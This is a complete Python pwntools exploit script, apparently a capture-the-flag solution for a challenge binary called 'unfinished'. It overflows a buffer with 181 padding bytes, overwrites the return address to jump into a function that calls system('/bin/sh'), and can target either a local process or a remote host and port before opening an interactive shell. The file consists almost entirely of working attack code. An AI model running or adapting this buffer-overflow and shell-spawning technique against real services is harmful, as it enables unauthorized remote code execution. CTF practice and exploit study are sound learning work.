from pwn import *
import argparse
import os

# Binary and library paths
BINARY = './unfinished'
LIBC_PATH = './libc.so.6'
LD_PATH = './ld-linux-x86-64.so.2'

# Offsets and important addresses
SIGMA_MODE = 0x4019b6  # system("/bin/sh") inside sigma_mode
OFFSET = 181

# Setup context
context.binary = BINARY

def start_local():
    return process([LD_PATH, '--library-path', os.path.dirname(LIBC_PATH), BINARY])

def start_remote(host, port):
    return remote(host, port)

def build_payload():
    payload = b'230584300921369395 '
    payload += b'A' * OFFSET
    payload += p64(SIGMA_MODE)
    return payload

def exploit(p):
    p.recvline()
    p.sendline(build_payload())
    sleep(0.2)
    p.sendline(b'id')
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit script for unfinished challenge.")
    parser.add_argument('--host', help='Remote host to connect')
    parser.add_argument('--port', type=int, help='Remote port to connect')
    args = parser.parse_args()

    if args.host and args.port:
        p = start_remote(args.host, args.port)
    else:
        p = start_local()

    exploit(p)

if __name__ == '__main__':
    main()